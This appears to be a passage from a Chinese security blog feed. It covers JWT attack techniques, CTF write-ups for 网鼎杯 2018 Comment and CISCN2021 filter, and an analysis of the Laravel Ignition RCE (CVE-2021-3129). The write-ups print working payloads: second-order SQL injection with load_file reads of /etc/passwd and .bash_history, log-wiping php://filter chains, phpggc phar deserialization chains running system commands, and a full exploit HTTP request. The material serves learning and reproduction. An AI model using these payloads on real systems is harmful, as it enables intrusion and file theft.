href="#结构">🍭</a>结构</h3><ul><li><p>Header（头部）</p><p>token的类型（“JWT”）和算法名称（比如：HMAC SHA256或RSA等）；用Base64对这个JSON编码就得到JWT的第一部分</p><pre><code class="hljs json">&#123;  <span class="hljs-attr">&quot;alg&quot;</span>: <span class="hljs-string">&quot;HS256&quot;</span>,  <span class="hljs-attr">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span>&#125;</code></pre></li><li><p>Payload（负载）</p><p>包含关于实体(通常是用户)和其他数据的声明，声明有三种类型：</p><ul><li><p>Registered claims : 这里有一组预定义的声明，不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience)等。</p></li><li><p>Public claims : 可以随意定义。</p></li><li><p>Private claims : 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明。</p></li></ul><p>对payload进行Base64编码就得到JWT的第二部分。</p></li><li><p>Signature（签名）</p><p>Signature 部分是对前两部分的签名，防止数据篡改。</p><p>首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。</p> <pre><code class="hljs lisp">HMACSHA256(  base64UrlEncode(<span class="hljs-name">header</span>) + <span class="hljs-string">&quot;.&quot;</span> +  base64UrlEncode(<span class="hljs-name">payload</span>),  secret)</code></pre><p>算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用&quot;点&quot;（<code>.</code>）分隔，就可以返回给用户。</p></li></ul><p>格式：</p><pre><code class="hljs stylus">Header<span class="hljs-selector-class">.Payload</span><span class="hljs-selector-class">.Signature</span>  <span class="hljs-comment">//用圆点(.)连接</span></code></pre><p>Header 和 Payload 串型化的算法是 Base64URL。这个算法跟 Base64 算法基本类似，但有一些不同。</p><p>JWT 作为一个令牌（token），有些场合可能会放到 URL，Base64 有三个字符<code>+</code>、<code>/</code>和<code>=</code>，在 URL 里面有特殊含义，所以要被替换掉：<code>=</code>被省略、<code>+</code>替换成<code>-</code>，<code>/</code>替换成<code>_</code> 。</p><p>实例：</p><p><img src="/2021/07/19/11/3.png" alt="3"></p><h3 id="使用场景"><a class="header-anchor" href="#使用场景">🍭</a>使用场景</h3><ul><li><strong>Authorization</strong> (授权) : 这是使用JWT的最常见场景。一旦用户登录，后续每个请求都将包含JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是现在广泛使用的JWT的一个特性，因为它的开销很小，并且可以轻松地跨域使用。</li><li><strong>Information Exchange</strong> (信息交换) : 对于安全的在各方之间传输信息而言，JSON Web Tokens无疑是一种很好的方式。因为JWTs可以被签名，例如，用公钥/私钥对，可以确定发送人就是它们所说的那个人。另外，由于签名是使用头和有效负载计算的，还可以验证内容没有被篡改。</li></ul><h3 id="JWT与Session的差异"><a class="header-anchor" href="#JWT与Session的差异">🍭</a>JWT与Session的差异</h3><p>JWT与Session很像，但Session是在服务器端的，而JWT是在客户端的。Session方式存储用户信息的最大问题在于要占用大量服务器内存，增加服务器的开销。而JWT方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力。</p><h3 id="攻击手段"><a class="header-anchor" href="#攻击手段">🍭</a>攻击手段</h3><h4 id="敏感信息泄露"><a class="header-anchor" href="#敏感信息泄露">🍭</a>敏感信息泄露</h4><p>当服务端的秘钥泄密的时候，JWT的伪造就变得非常简单容易</p><h4 id="将加密方式改为’none’"><a class="header-anchor" href="#将加密方式改为’none’">🍭</a>将加密方式改为’none’</h4><p>签名算法确保恶意用户在传输过程中不会修改JWT。但是标题中的alg字段可以更改为none。一些JWT库支持无算法，即没有签名算法。当alg为none时，后端将不执行签名验证。将alg更改为none后，从JWT中删除签名数据（仅标题+‘.’+ payload +‘.’）并将其提交给服务器</p><h4 id="将算法RS256修改为HS256（非对称密码算法-对称密码算法）"><a class="header-anchor" href="#将算法RS256修改为HS256（非对称密码算法-对称密码算法）">🍭</a>将算法RS256修改为HS256（非对称密码算法=&gt;对称密码算法）</h4><p>HS256使用密钥来签名和验证每个消息。而RS256使用私钥对消息进行签名并使用公钥进行认证。如果将算法从RS256更改为HS256，则后端代码使用公钥作为密钥，然后使用HS256算法验证签名。由于攻击者有时可以获取公钥，因此攻击者可以将标头中的算法修改为HS256，然后使用RSA公钥对数据进行签名。此时，后端代码就会使用RSA公钥+HS256算法进行签名验证，从而让验证通过。</p><h4 id="HS256（对称加密）密钥破解"><a class="header-anchor" href="#HS256（对称加密）密钥破解">🍭</a>HS256（对称加密）密钥破解</h4><p>如果HS256密钥强度较弱，则可以直接强制使用，通过爆破 HS256的秘钥可以完成该操作。难度比较低。解决对策很简单，使用复杂的秘钥即可。</p><h4 id="错误的堆叠加密-签名验证假设"><a class="header-anchor" href="#错误的堆叠加密-签名验证假设">🍭</a>错误的堆叠加密+签名验证假设</h4><p>详见：<a href="https://www.freebuf.com/articles/web/181261.html">https://www.freebuf.com/articles/web/181261.html</a></p><h4 id="无效椭圆曲线攻击"><a class="header-anchor" href="#无效椭圆曲线攻击">🍭</a>无效椭圆曲线攻击</h4><p>在椭圆曲线加密中，公钥是椭圆曲线上的一个点，而私钥只是一个位于特殊但非常大的范围内的数字。 如果未验证对这些操作的输入，那攻击者就可以进行设计，从而恢复私钥。这类攻击被称为无效曲线攻击。</p><p>详见：<a href="http://blogs.adobe.com/security/2017/03/critical-vulnerability-uncovered-in-json-encryption.html">critical-vulnerability-uncovered-in-json-encryption</a></p><h4 id="替换攻击"><a class="header-anchor" href="#替换攻击">🍭</a>替换攻击</h4><p>在这种攻击中，攻击者需要至少获得两种不同的JWT，然后攻击者可以将令牌中的一个或者两个用在其他的地方。</p><p>在JWT中，替换攻击有两种方式：相同接收方攻击（跨越式JWT）和不同接收方攻击。</p><p><strong>不同接收方攻击</strong></p><p>设想一个业务逻辑：</p><blockquote><p>Auth 机构，有着自己的私钥，并且给 App1 和 App2 发放了两个公钥，用于验证签名；</p><p>Attacker 利用自己的秘钥登录了 App1。</p></blockquote><p>此时 Auth 机构给 Attacker 下发了一个 附带签名的JWT，其payload内容为：</p><pre><code class="hljs 1c">&#123;    &#x27;uname&#x27;:&#x27;Attacker&#x27;    &#x27;role&#x27; :&#x27;admin&#x27;&#125;</code></pre><p>此时，如果 Attacker 知道 App1 和 App2 的公钥是同一个Auth 签发的话，他可以利用这个JWT去登录 App2，从而获取Admin权限。</p><p><strong>相同接收方攻击/跨越式JWT same recipient/Cross JWT</strong></p><p>设想一个业务逻辑：</p><blockquote><p>在同一站点下，有两个应用程序，wordpress和phpmyadmin，他们都利用了相同的秘钥对和算法来验证JWT签名；</p><p>站点管理员知道 Different Recipient 的问题，所以给 wordpress 的应用增加了 aud 验证，但是 phpmyadmin 的用户人数较少，没有增加 aud 的验证；</p><p>Attacker 利用自己的秘钥登录了 wordpress。</p></blockquote><p>此时 站点 给 Attacker 下发了一个 附带签名的JWT，其payload内容为：</p><pre><code class="hljs sml">&#123;    <span class="hljs-symbol">&#x27;uname&#x27;</span>:<span class="hljs-symbol">&#x27;Attacker&#x27;</span>    <span class="hljs-symbol">&#x27;role&#x27;</span> :<span class="hljs-symbol">&#x27;writer&#x27;</span>    <span class="hljs-symbol">&#x27;aud&#x27;</span> :<span class="hljs-symbol">&#x27;shaobaobaoer</span>.cn/wordpress&#x27;    <span class="hljs-symbol">&#x27;iss&#x27;</span> :<span class="hljs-symbol">&#x27;shaobaobaoer</span>.cn&#x27;&#125;</code></pre><p>这个JWT看似非常安全，但这仅仅是对于 wordpress 的应用程序而言，。从而Attacker 可以以 writer 的身份登录 phpmyadmin。</p><h3 id="特点"><a class="header-anchor" href="#特点">🍭</a>特点</h3><ul><li>JWT 默认是不加密。</li><li>JWT 不加密的情况下，不能将秘密数据写入 JWT。</li><li>JWT 不仅可以用于认证，也可以用于交换信息。有效使用 JWT，可以降低服务器查询数据库的次数。</li><li>由于服务器不保存 session 状态，因此无法在使用过程中废止某个 token，或者更改 token 的权限。也就是说，一旦 JWT 签发了，在到期之前就会始终有效，除非服务器部署额外的逻辑。</li><li>JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT 的有效期应该设置得比较短。对于一些比较重要的权限，使用时应该再次对用户进行认证。</li><li>为了减少盗用，JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输。</li></ul><p>参考：</p><p><a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">JSON Web Token 入门教程</a></p><p><a href="https://www.freebuf.com/articles/web/181261.html">深入了解Json Web Token之实战篇</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>网鼎杯 2018||Comment</title>
    <link href="/2021/07/17/lod/"/>
    <url>/2021/07/17/lod/</url>
    
    <content type="html"><![CDATA[<p>涉及知识点</p><ul><li>二次注入</li><li>git泄露</li><li>git恢复</li></ul><p>进入页面是一个留言板（盲猜二次注入），需要登录，密码后三位未知，bp爆破</p><p><img src="/2021/07/17/lod/1.jpg" alt="1"></p><p>没找到注入点，后台扫描，git泄露</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;session_start();<span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;    header(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);    <span class="hljs-keyword">die</span>();&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<span class="hljs-keyword">switch</span> ($_GET[<span class="hljs-string">&#x27;do&#x27;</span>])&#123;<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:    <span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:    <span class="hljs-keyword">break</span>;<span class="hljs-keyword">default</span>:    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);&#125;&#125;<span class="hljs-keyword">else</span>&#123;    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>源码不全</p><blockquote><p>git log --all  or  git log --reflog//查看文件更改日志</p><pre><code class="hljs angelscript">&gt;commit e5b2a2443c2b6d395d06960123142bc91123148c (<span class="hljs-built_in">ref</span>s/stash)&gt;Merge: bfbdf21 <span class="hljs-number">5556e3</span>a&gt;Author: root &lt;<span class="hljs-symbol">root@</span>localhost.localdomain&gt;&gt;Date:   Sat Aug <span class="hljs-number">11</span> <span class="hljs-number">22</span>:<span class="hljs-number">51</span>:<span class="hljs-number">17</span> <span class="hljs-number">2018</span> +<span class="hljs-number">0800</span>   WIP on master: bfbdf21 add write_do.php&gt;commit <span class="hljs-number">5556e3</span>ad3f21a0cf5938e26985a04ce3aa73faaf&gt;Author: root &lt;<span class="hljs-symbol">root@</span>localhost.localdomain&gt;&gt;Date:   Sat Aug <span class="hljs-number">11</span> <span class="hljs-number">22</span>:<span class="hljs-number">51</span>:<span class="hljs-number">17</span> <span class="hljs-number">2018</span> +<span class="hljs-number">0800</span>   index on master: bfbdf21 add write_do.php&gt;commit bfbdf218902476c5c6164beedd8d2fcf593ea23b (HEAD -&gt; master)&gt;Author: root &lt;<span class="hljs-symbol">root@</span>localhost.localdomain&gt;&gt;Date:   Sat Aug <span class="hljs-number">11</span> <span class="hljs-number">22</span>:<span class="hljs-number">47</span>:<span class="hljs-number">29</span> <span class="hljs-number">2018</span> +<span class="hljs-number">0800</span>   add write_do.php</code></pre><p>git reset --hard xxx//xxx即为日志记录中最后更改时记录名称本题即为<code>e5b2a2443c2b6d395d06960123142bc91123148c</code></p></blockquote><p>完整代码：</p><p><img src="/2021/07/17/lod/1.png" alt="1"></p><p>解题点：addslashes过滤后产生的<code>\</code>不会进入数据库，<code>'1过滤后变成\'1</code>，进入库中却仍为<code>'1</code>，取出数据后进行二次拼接，即可造成注入。</p><p>获取权限：</p><blockquote><p>在发帖处构造category为</p><pre><code class="hljs fix"><span class="hljs-attr">&gt;&#x27;, content</span>=<span class="hljs-string">user(),/*</span></code></pre><p>在留言处输入的content为</p><pre><code class="hljs arcade">&gt;*<span class="hljs-regexp">/#     /</span><span class="hljs-regexp">/闭合payload 中带有的 /</span>*</code></pre><p>得到</p><pre><code class="hljs vim">&gt;$sql = <span class="hljs-comment">&quot;insert into comment</span> <span class="hljs-keyword">set</span> category = <span class="hljs-string">&#x27;&#x27;</span>, content=user(),/*       content = <span class="hljs-string">&#x27;*/#&#x27;</span>,     bo_id = <span class="hljs-string">&#x27;$bo_id&#x27;</span><span class="hljs-comment">&quot;;</span></code></pre><p>注：虽然category 是经过 addslashes 转义后写入数据库的，但是取出时是没有被转义的，即没有反斜杠的因为<code>放到数据库后会把转义符 \ 去掉（进入数据库后是没有反斜杠的）</code>，但是在cmment中，对于category的值从数据库取出来没有进行转义，直接拼接到sql insert语句中，这就存在二次注入的可能.</p><blockquote><img src="/2021/07/17/lod/2.jpg" alt="2" style="zoom:50%;"></blockquote></blockquote><p>读取/etc/passwd</p><blockquote><p>一般 <strong>flag</strong> 不会在数据库里面(因为如果在数据库中，不需要root权限)，现在要用 <strong>SQL语句</strong> 读取flag文件</p><blockquote><p>格式</p><p><code>select load_file(‘文件绝对路径’)</code></p><p>常见用法</p><blockquote><ul><li>读/etc/init.d下的东西，这里有配置文件路径<br><code>?id=1' union select 1,2,load_file('/etc/init.d/httpd')</code></li><li>得到web安装路径<br><code>?id=1' union select 1,2,load_file('/etc/apache/conf/httpd.conf')</code></li><li>读取密码文件<br><code>?id=1' union select 1,2,load_file('var/www/html/xxx.com/php/conn.inc.php')</code></li></ul></blockquote></blockquote></blockquote><p>payload</p><pre><code class="hljs sql">1&#x27;,content=(<span class="hljs-keyword">select</span> (<span class="hljs-keyword">load_file</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>))),<span class="hljs-comment">/*</span></code></pre><img src="/2021/07/17/lod/3.jpg" alt="3" style="zoom:67%;"><p>/etc/passwd中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段，其格式和具体含义如下：</p><p><code>用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell</code></p><p><strong>tips</strong></p><blockquote><p>伪用户含义:</p><p>bin        拥有可执行的用户命令文件</p><p>sys        拥有系统文件</p><p>adm       拥有帐户文件</p><p>uucp      UUCP使用</p><p>lplp或lpd   子系统使用</p><p>nobody    NFS使用</p><p>如下：</p><img src="/2021/07/17/lod/4.jpg" alt="4" style="zoom:50%;"><table><thead><tr><th>字段</th><th>含义</th></tr></thead><tbody><tr><td>1</td><td>用户名</td></tr><tr><td>2</td><td>用户的密码原来直接存储在第二字段，但是为了安全，最后专门有了/etc/shadow文件，现在默认用x替代</td></tr><tr><td>3</td><td>用户的uid,一般情况下root为0，1-499默认为系统账号，有的更大些到1000，500-65535为用户的可登录账号，有的系统从1000开始。</td></tr><tr><td>4</td><td>用户的gid,linux的用户都会有两个ID,一个是用户uid，一个是用户组id，在我们登录的时候，输入用户名和密码，其实会先到/etc/passwd查看是否有你输入的账号或者用户名，有的话将该账号与对应的UID和GID(在/etc/group中)读出来。然后读出主文件夹与shell的设置，然后再去检验密码是否正确，正确的话正常登录。</td></tr><tr><td>5</td><td>用户的账号说明解释</td></tr><tr><td>6</td><td>用户的家目录文件夹</td></tr><tr><td>7</td><td>用户使用的shell，如果换成/sbin/nologin/就是默认没有登录环境的。</td></tr></tbody></table></blockquote><p>www用户(一般和网站操作相关的用户，由中间件创建）的目录是/home/www可以查看 <code>.bash_history</code> 记录（每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件，保存了当前用户使用过的历史命令，方便查找。）</p><p>payload</p><pre><code class="hljs awk">a<span class="hljs-string">&#x27;,content=(select (load_file(&#x27;</span><span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/.bash_history&#x27;))),/</span>*</code></pre><p><img src="/2021/07/17/lod/5.jpg" alt="5"></p><p>先进入/tmp/目录，然后解压html.zip，又把这个.zip文件删除了。然后又把解压得到的html这个文件夹复制到了/var/www/下面，然后又进入/var/www/html，将.DS_Store(.DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，<em>目的在于存贮目录的自定义属性</em>，例如文件们的图标位置或者是背景色的选择。<em>通过.DS_Store可以知道这个目录里面所有文件的清单</em>。)给删除，然后开启apache2服务。</p><p><em>/var/www/html下的.DS_Store被删，而/tmp/html下的.DS_Store没有被删除</em></p><p><code>.DS_Store</code> 文件中，经常会有一些不可键字符，所以我们可以使用hex函数对其内容进行转换，</p><p>payload</p><pre><code class="hljs awk"><span class="hljs-string">&#x27;, content=(select hex(load_file(&#x27;</span><span class="hljs-regexp">/tmp/</span>html<span class="hljs-regexp">/.DS_Store&#x27;))),/</span>*</code></pre><p>解码</p><p><img src="/2021/07/17/lod/6.jpg" alt="6"></p><p>flag在flag_8946e1ff1ee3e40f.php里（不能在/tmp目录下，要回到/var/www/html ）</p><p>payload</p><pre><code class="hljs 最后一个坑，查看源码获得flag">a&#39;,content&#x3D;(select hex(load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.php&#39;))),&#x2F;*</code></pre><p>解码</p><img src="/2021/07/17/lod/7.jpg" alt="7" style="zoom: 67%;"><p>参考：</p><p><a href="https://mochazz.github.io/2018/09/01/2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E5%9B%9B%E5%9C%BA/#comment">2018网鼎杯第四场Web题解</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2021 Quals-filter</title>
    <link href="/2021/07/15/filter2/"/>
    <url>/2021/07/15/filter2/</url>
    
    <content type="html"><![CDATA[<p>了解yii2及lavael后filter的复现就很简单了</p><p>hint：</p><p><img src="/2021/07/15/filter2/1.jpg" alt="1"></p><p>附件做了如下更改</p><p><img src="/2021/07/15/filter2/2.jpg" alt="2"></p><p>看一下依赖发现<code>monolog</code>符合</p><p><img src="/2021/07/15/filter2/3.jpg" alt="3"></p><p>直接打</p><h4 id="清空日志文件"><a class="header-anchor" href="#清空日志文件">🍭</a>清空日志文件</h4><p><code>?file=php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../runtime/logs/app.log</code></p><p><img src="/2021/07/15/filter2/4.jpg" alt="4"></p><h4 id="生成payload"><a class="header-anchor" href="#生成payload">🍭</a>生成payload</h4><h5 id="法一"><a class="header-anchor" href="#法一">🍭</a>法一</h5><p>生成时顺便编码</p><p><code>php -d'phar.readonly=0' ./phpggc Monolog/RCE1 &quot;phpinfo&quot; &quot;1&quot; --phar phar -o php://output | base64 -w0 | python -c &quot;import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())&quot;</code></p><p><img src="/2021/07/15/filter2/8.png" alt="8"></p><h5 id="法二"><a class="header-anchor" href="#法二">🍭</a>法二</h5><p>先生成再编码</p><p>``php -d’phar.readonly=0’ ./phpggc Monolog/RCE1 “phpinfo” “1” --phar phar -o php://output | base64 -w0`</p><p>编码脚本</p><pre><code class="hljs stylus">from binascii import b2a_hexpayload = <span class="hljs-string">&quot;&quot;</span>armedPayload = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> payload:    <span class="hljs-selector-tag">i</span> = <span class="hljs-string">&quot;=&quot;</span>+b2a_hex(<span class="hljs-selector-tag">i</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).upper()    armedPayload += i+<span class="hljs-string">&quot;=00&quot;</span><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;123456789012345&quot;</span>+armedPayload)</span></span></code></pre><h4 id="发送偶数文件名"><a class="header-anchor" href="#发送偶数文件名">🍭</a>发送偶数文件名</h4><pre><code class="hljs routeros">?<span class="hljs-attribute">file</span>=AA</code></pre><h4 id="写入日志"><a class="header-anchor" href="#写入日志">🍭</a>写入日志</h4><p>记得加字符a（Laravel debug rce里解释过了）</p><p><img src="/2021/07/15/filter2/5.jpg" alt="5"></p><h4 id="过滤无关字符"><a class="header-anchor" href="#过滤无关字符">🍭</a>过滤无关字符</h4><p><code>file=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/logs/app.log</code></p><p><img src="/2021/07/15/filter2/6.jpg" alt="6"></p><h4 id="触发phar"><a class="header-anchor" href="#触发phar">🍭</a>触发phar</h4><p><code>file=phar://../runtime/logs/app.log/test.txt</code></p><p><img src="/2021/07/15/filter2/9.png" alt="9"></p><p>根目录下找到<code>This_is_flaaagggg</code></p><p>生成payload链</p><pre><code class="hljs awk">php -d<span class="hljs-string">&#x27;phar.readonly=0&#x27;</span> .<span class="hljs-regexp">/phpggc Monolog/</span>RCE1 <span class="hljs-string">&quot;system&quot;</span> <span class="hljs-string">&quot;cat /This_is_flaaagggg&quot;</span> --phar phar -o php:<span class="hljs-regexp">//</span>output | base64 -w0 | python -c <span class="hljs-string">&quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:].zfill(2) + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span></code></pre><p><img src="/2021/07/15/filter2/11.png" alt="11"></p><p>再重复一遍上面的操作（记得再清一次日志），得到flag：</p><p><img src="/2021/07/15/filter2/12.png" alt="12"></p><p>参考：<a href="https://blog.csdn.net/qq_38154820/article/details/117794547">通过几道CTF题学习yii2框架</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>phar</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Laravel Debug RCE（CVE-2021-3129）分析</title>
    <link href="/2021/07/14/rce-0/"/>
    <url>/2021/07/14/rce-0/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00简介"><a class="header-anchor" href="#0x00简介">🍭</a>0x00简介</h2><p>Laravel是一套简洁、优雅的PHP Web开发框架(PHP Web Framework)。它可以让你从面条一样杂乱的代码中解脱出来；它可以构建一个完美的网络APP，而且每行代码都可以简洁、富于表达力。</p><h2 id="0x01漏洞概述"><a class="header-anchor" href="#0x01漏洞概述">🍭</a>0x01漏洞概述</h2><p>当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。</p><h2 id="0x02影响版本"><a class="header-anchor" href="#0x02影响版本">🍭</a>0x02影响版本</h2><p>Laravel &lt;= 8.4.2<br>Ignition &lt;= 2.5.1</p><h2 id="0x03环境搭建"><a class="header-anchor" href="#0x03环境搭建">🍭</a>0x03环境搭建</h2><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SNCKER/</span>CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">3129</span>cd CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">3129</span>docker-compose up -d<span class="hljs-regexp">//</span>拉取镜像</code></pre><p>建完访问</p><p><img src="/2021/07/14/rce-0/1.jpg" alt="1"></p><h2 id="0x04漏洞分析"><a class="header-anchor" href="#0x04漏洞分析">🍭</a>0x04漏洞分析</h2><p>为复现变量未定义时出现的报错情况，漏洞文件在resource/views/ hello.blade.php中设置一个简单的模板</p><p><img src="/2021/07/14/rce-0/4.jpg" alt="4"></p><p>并在routes/web.php中添加路由</p><p><img src="/2021/07/14/rce-0/5.jpg" alt="5"></p><p>访问出现变量未定义的报错信息</p><p><img src="/2021/07/14/rce-0/3.jpg" alt="3"></p><p>抓包</p><p><img src="/2021/07/14/rce-0/6.jpg" alt="6"></p><p>请求的接口为/_ignition/execute-solution，以此入手，审计代码。搜索路由</p><p><img src="/2021/07/14/rce-0/7.jpg" alt="7"></p><p>对应的处理类为ExecuteSolutionController，此处类对象被当做函数调用，因此会调用ExecuteSolutionController类的__invoke方法。</p><p><img src="/2021/07/14/rce-0/8.jpg" alt="8"></p><p>先调用ExecuteSolutionRequest-&gt;getRunnableSolution()获取solution对象，随后调用solution对象的run方法，先跟进ExecuteSolutionRequest的getRunnableSolution方法</p><p><img src="/2021/07/14/rce-0/9.jpg" alt="9"></p><p><code>solution对象来自getSolution方法的返回，并且必须是RunnableSolution类的实例</code>==&gt;<code>solution对象的类必须是RunnableSolution类的子类</code>,在getSolution方法中，类来源于传递的solution参数</p><p><img src="/2021/07/14/rce-0/10.jpg" alt="10"></p><p>MakeView VariableOptionalSolution恰好继承于RunableSolution接口，符合上述条件。跟进到MakeViewVariableOptionalSolution的run方法，</p><p><img src="/2021/07/14/rce-0/11.jpg" alt="11"></p><p><code>$parameters</code>参数被传递到makeOptional参数处理，并且viewFile参数对应的文件会被file_get_contents方法读取，</p><p><img src="/2021/07/14/rce-0/12.jpg" alt="12"></p><p>并将<code>$username</code>替换为<code>$username ? ‘’</code>，后续会做Token化比对，因此没办法直接控制variableName参数。但由于viewFile可控，且经过file_get_contents方法处理，如果能够上传或者写入Phar文件，是可以利用phar://实现反序列化的。</p><h2 id="0x05漏洞利用"><a class="header-anchor" href="#0x05漏洞利用">🍭</a>0x05漏洞利用</h2><p>现在唯一可控部分内容的文件是laravel的日志文件。通过本漏洞的路由请求一个不存在的文件名作为<code>viewFile</code>的值，就可以把这个值保存到log文件中。此时就算能控制一部分日志内容，但可控内容前后有日期、堆栈信息等太多不可控内容，没办法直接写入Phar文件。这时候需要利用php://filter伪协议对文件内容进行多种编解码。</p><blockquote><p>利用base64解码能够在有一部分干扰内容情况下仍然解码成功，但如果有=等字符则可干扰正常解码。利用convert.iconv.utf-16le.utf-8，可以将其他干扰内容转换成非ascii，而非ascii字符再经过base64解码即可变成空。但utf-16le编码中会有一些空字符，传递到file_get_contents方法中会报错。因此还需要利用convert.quoted-printable-encode可以将空字符编码为=00，再使用与之相对的decode方法即可解决这个问题。</p></blockquote><p>整体的流程：<code>ExecuteSolutionController-&gt;__invoke() -&gt;  ExecuteSolutionRequest -&gt; getRunnableSolution() -&gt; getSolution()  -&gt; MakeViewVariableOptionalSolution-&gt;run()</code></p><h2 id="0x06漏洞复现"><a class="header-anchor" href="#0x06漏洞复现">🍭</a>0x06漏洞复现</h2><h4 id="方式一"><a class="header-anchor" href="#方式一">🍭</a>方式一</h4><h5 id="清空laravel-log"><a class="header-anchor" href="#清空laravel-log">🍭</a>清空laravel.log</h5><p>抓包，传入如下内容</p><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 192.x.x.x:8888<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Referer</span>: http://192.x.x.x:8888/_ignition/execute-solution<span class="hljs-attribute">Content-Type</span>: application/json<span class="hljs-attribute">Content-Length</span>: 320<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1&#123;&quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,&quot;parameters&quot;:&#123;&quot;variableName&quot;: &quot;username&quot;,&quot;viewFile&quot;: &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=xxx/storage/logs/laravel.log&quot;&#125;&#125;</code></pre><p>另一种方法是viewfile值为<code>php://filter/read=convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=xxx/storage/logs/laravel.log</code></p><p>但要执行多次才能清空日志。因为多次base64解码出现一些非预期的问题，如果在某次decode时，<code>=</code>号后面出现了别的base64字符，php会报Warning。且由于laravel开启了debug模式，所以会触发<code>Ignition</code>生成错误页面，导致decode后的字符没有成功写入。</p><h5 id="发送偶数文件名的请求"><a class="header-anchor" href="#发送偶数文件名的请求">🍭</a>发送偶数文件名的请求</h5><p>发送一个viewFile值为11的请求即可(原因如下面坑点3)</p><h5 id="向日志中插入Payload"><a class="header-anchor" href="#向日志中插入Payload">🍭</a>向日志中插入Payload</h5><p>从phpggc里拿一条laravel中存在的拓展的链子生成payload（phpggc用法在另一篇文章说明）</p><pre><code class="hljs awk">.<span class="hljs-regexp">/phpggc monolog/</span>rce1 call_user_func phpinfo --phar phar -o php:<span class="hljs-regexp">//</span>output</code></pre><p>因为保存到log中的POC有许多垃圾字符，如当写入POCPOCPOC时会有三处字符显示</p><p><img src="/2021/07/14/rce-0/15.jpg" alt="15"></p><p>且POC的两侧都有垃圾字符。因此需要尝试把垃圾字符去掉，只保留我们的POC。</p><h6 id="tips："><a class="header-anchor" 